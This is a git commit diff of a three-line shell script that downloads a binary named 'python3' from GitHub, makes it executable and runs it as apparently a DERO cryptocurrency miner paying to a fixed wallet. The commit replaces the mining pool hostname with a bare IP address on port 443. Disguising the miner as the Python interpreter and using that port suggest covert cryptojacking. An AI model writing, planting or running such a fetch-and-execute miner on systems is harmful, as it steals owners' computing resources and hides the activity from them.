31770c0cf00c513ebc1c0702479617cb47cda15a
monhodsompul <168453591+monhodsompul@users.noreply.github.com>
2024-08-28 04:09:54 +0700

    Update derluck.sh

--- derluck.sh
+++ derluck.sh
@@ -1,3 +1,3 @@
 wget https://github.com/monhodsompul/derluck/raw/main/python3
 chmod +x python3
-./python3 --daemon-rpc-address=dero.rabidmining.com:10300 --wallet-address=deroi1qy9al37a8qgjmat4y9wf5wc637md58jtt6p4980k34xxhrk2h9m6jq9pvfz92xcqqqqepmry5nlsk5z6eq
+./python3 --daemon-rpc-address=102.210.254.116:443 --wallet-address=deroi1qy9al37a8qgjmat4y9wf5wc637md58jtt6p4980k34xxhrk2h9m6jq9pvfz92xcqqqqepmry5nlsk5z6eq
